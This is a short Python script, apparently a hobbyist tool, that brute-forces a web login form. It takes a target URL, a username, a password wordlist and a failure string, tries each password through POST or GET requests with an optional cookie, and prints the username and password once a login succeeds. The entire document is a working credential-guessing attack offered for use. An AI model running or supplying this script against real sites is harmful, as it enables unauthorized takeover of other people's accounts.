import requests

url = input("[+] Enter Page Url:")
username = input("[+] Enter username for Account to bruteforce : ")
password_file = input("[+] Enter password file to use : ")
login_failed_string = input("[+] enter string that occurs whan Login Fail : ")
cookie_value = input('Enter Cookie Value(Optional)')

def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print("trying: " + password)
        data = {"username": username, "password": password, "Login": "submit"}
        responce = requests.post(url, data=data)
        if cookie_value != '':
            responce = requests.get(url ,params={"username": username, "password": password, "Login": "Login"} , cookies={'Cookie':cookie_value})
        else :
            responce = requests.post(url , data=data)
        if login_failed_string in responce.content.decode():
            pass
        else:
            print("[+] Found username : ==> " + username)
            print("[+] Found password : ==> " + password)
            exit()


with open(password_file, "r") as passwords:
    cracking(username, url)

print("[!!] Password not in list")
